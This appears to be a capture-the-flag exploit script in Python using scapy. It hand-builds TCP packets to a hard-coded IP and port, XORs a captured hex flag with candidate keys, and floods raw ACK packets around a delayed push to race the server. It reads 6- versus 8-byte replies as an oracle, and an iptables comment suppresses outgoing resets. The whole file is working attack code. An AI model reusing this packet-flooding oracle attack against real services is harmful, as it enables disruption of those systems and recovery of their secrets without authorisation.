from scapy.all import sr1, send, IP, TCP, Raw, conf, ETH_P_ALL
import socket
import random
import codecs


# sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST --dport 5452 -j DROP


# Config
#ip = IP(src="127.0.0.1", dst="127.0.0.1")
#ip = IP(src="10.128.0.2", dst="140.112.30.35")
#ip = IP(src="10.128.0.2", dst="10.128.0.3")
# ip = IP(src="10.71.22.2", dst="10.71.22.1")
ip = IP(dst="18.214.89.223")

#dport = 9001
dport = 5452

prompt = b'[*] Result: '
flagSZ = 2

conf.verb = False


# Utils
class L3Packet(object):
    desc = "Optimized for flooding, modified from scapy's L3PacketSocket"
    def __init__(self, pkt, kind=ETH_P_ALL):
        self.type = kind
        self.outs = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(kind))
        self.outs.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**30)
        iff, a, gw  = pkt.route()
        if iff is None:
            iff = conf.iface
        sdto = (iff, self.type)
        self.outs.bind(sdto)
        sn = self.outs.getsockname()
        ll = lambda pkt: pkt
        if type(pkt) in conf.l3types:
            sdto = (iff, conf.l3types[type(pkt)])
        if sn[3] in conf.l2types:
            ll = lambda pkt: conf.l2types[sn[3]]()/pkt
        self.data = bytes(ll(pkt))
        self.func = self.outs.send

    def send(self):
        return self.func(self.data)

    def destroy(self):
        self.func = self.data = None
        return self.outs.close()


def test(xorkey):
    seq = random.randrange(0, 1<<31)
    sport = random.randrange(20000, 30000)

    # Connect
    SYN = TCP(sport=sport, dport=dport, flags="S", seq=seq, window=64240)
    seq += 1
    SYNACK = sr1(ip/SYN)
    ack = SYNACK.seq + 1
    print(repr(SYNACK))
    ACK = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack, window=64240)


    # Receive
    data = b''
    while len(data) < 81 * (flagSZ + 1):
        PKT = sr1(ip/ACK)
        load = getattr(PKT, 'load', '')
        print(len(load))
        print(load)
        ack = PKT.seq + len(load)
        ACK = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack, window=64240)
        data += load

    send(ip/ACK)


    # Parse the data
    data = data.splitlines()
    print(data)
    flag = data[:flagSZ]
    payload = codecs.decode(b''.join(flag), 'hex')


    # An invalid json payload, it should return a length 6 packet.
    # payload = b'00000' + payload[5:]
    xorkey = list(xorkey) + [0] * len(payload)
    payload = bytes(a ^ b for a, b in zip(payload, xorkey))


    payload = codecs.encode(payload, 'hex')
    payload = b''.join([payload[i:i+80] + b'\n' for i in range(0, len(payload), 80)])


    ret = None
    for _ in range(29):
        # Send the payload except last byte to remote first
        DAT = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack, window=64240)
        DAT = DAT / Raw(payload[:-1])
        seq += len(DAT.load)
        ACK = sr1(ip/DAT)
        print(repr(ACK))


        # Prepare the trigger
        PSH = TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack, window=64240)
        PSH = PSH / Raw(payload[-1:])
        seq += len(PSH.load)
        ack += len(prompt) * 2
        ACK = TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack, window=64240)


        # Flood ACK packets
        ACKPKT = L3Packet(ip/ACK)
        PSHPKT = L3Packet(ip/PSH)

        print('start!!!!!!!!!!!!!!!!!!!!!!!')
        for _ in range(40):
            ACKPKT.send()
        PSHPKT.send()
        for _ in range(100):
            ACKPKT.send()
        print('done!!!!!!!!!!!!!!!!!!!!!!!')
        ACKPKT.destroy()
        PSHPKT.destroy()


        # Receive result
        sizes = []
        data = b''
        while len(data) < 81 * 2 - len(prompt) * 2:
            PKT = sr1(ip/ACK)
            load = getattr(PKT, 'load', b'')
            print(len(load))
            sizes.append(len(load))
            ack = PKT.seq + len(load)
            ACK = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack, window=64240)
            data += load
        send(ip/ACK)

        if 6 in sizes:
            ret = False
            break
        if 8 in sizes:
            ret = True
            break

    # Disconnect
    FIN = TCP(sport=sport, dport=dport, flags="FPA", seq=seq, ack=ack, window=64240)
    seq += 1
    PKT = sr1(ip/FIN)
    ack = PKT.seq + len(getattr(PKT, 'load', '')) + 1

    ACK = TCP(sport=sport, dport=dport, flags="A", seq=seq, ack=ack, window=64240)
    send(ip/ACK)

    return ret


def test_with_retry(xorkey, retry=10):
    ret = None
    for _ in range(retry):
        ret = test(xorkey)
        if ret is not None:
            break
    assert ret != None
    return ret
